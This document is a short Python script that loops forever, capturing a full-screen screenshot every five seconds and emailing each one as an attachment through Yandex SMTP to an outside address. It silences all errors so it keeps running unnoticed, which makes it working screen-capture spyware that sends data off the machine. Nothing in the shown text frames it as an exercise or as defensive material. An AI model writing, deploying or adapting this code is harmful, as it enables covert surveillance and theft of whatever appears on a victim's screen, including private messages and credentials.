import sys
import smtplib
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

from PIL import ImageGrab


while True:
    try:
        time.sleep(5)
        im2 = ImageGrab.grab(bbox=None)
        im2.save('image.jpg')
        msg = MIMEMultipart()
        msg['Subject'] = 'Тема письма'
        msg['From'] = 'olegpash2003@ya.ru'

        part = MIMEText('Текст письма\n')
        msg.attach(part)

        part = MIMEApplication(open('image.jpg', 'rb').read())
        part.add_header('Content-Disposition', 'attachment', filename='image.jpg')
        msg.attach(part)

        server = smtplib.SMTP('smtp.yandex.ru:587')
        server.ehlo()
        server.starttls()
        server.login('login', 'password')

        server.sendmail(msg['From'], ['helperle@ya.ru'], msg.as_string())
    except Exception:
        pass
